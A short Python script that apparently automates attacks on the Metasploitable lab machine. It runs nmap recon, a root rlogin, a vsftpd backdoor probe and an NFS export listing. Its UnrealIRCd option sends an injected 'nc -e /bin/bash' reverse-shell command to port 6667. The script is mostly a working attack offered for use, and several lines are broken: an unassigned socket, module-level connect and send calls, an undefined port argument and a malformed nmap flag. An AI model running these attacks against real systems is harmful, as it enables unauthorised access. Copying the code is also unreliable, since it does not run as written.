import socket
import argparse
import pickle
from subprocess import call

parser = argparse.ArgumentParser(description='Python Script for Automating Metasploitable attacks')
parser.add_argument("option", type=int, help="0. Recon with IP Mask\n1. rlogin\n2. VSFTPD Backdoor\n3. NFS\n4. Unreal IRC\n")
parser.add_argument('-i', '--host', help="IP of the target")
arg = parser.parse_args()

if arg.option == 0:
    if arg.host == None:
        print ("No host IP range provided!")
        exit()
    cmd = ["nmap", "/-p", arg.host]
    call(cmd)

if arg.option == 1:
    #print ("Entering Method 1")
    if arg.host == None:
        print ("No host IP provided!")
        exit()
    cmd = ["rlogin", "-l", "root", arg.host]
    call(cmd)

if arg.option == 2:
    if arg.host == None:
        print ("No host IP provided!")
        exit()
    cmd = ["telnet",arg.host,"21"]
    call(cmd)

if arg.option == 3:
    if arg.host == None:
        print ("No host IP provided!")
        exit()
    cmd = ["showmount", "-e", arg.host]
    call(cmd)

if arg.option == 4:
    if arg.host == None:
        print ("No host ip provided!")
        exit()
    socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    socket.connect((arg.host,6667))  # Connect to the irc server
    socket.recv(2048) # Receive the response of the server
    socket.send("AB; sh -c '(nc 127.0.0.1" + " " + arg.port + " -e /bin/bash) '\n")
    socket.close()
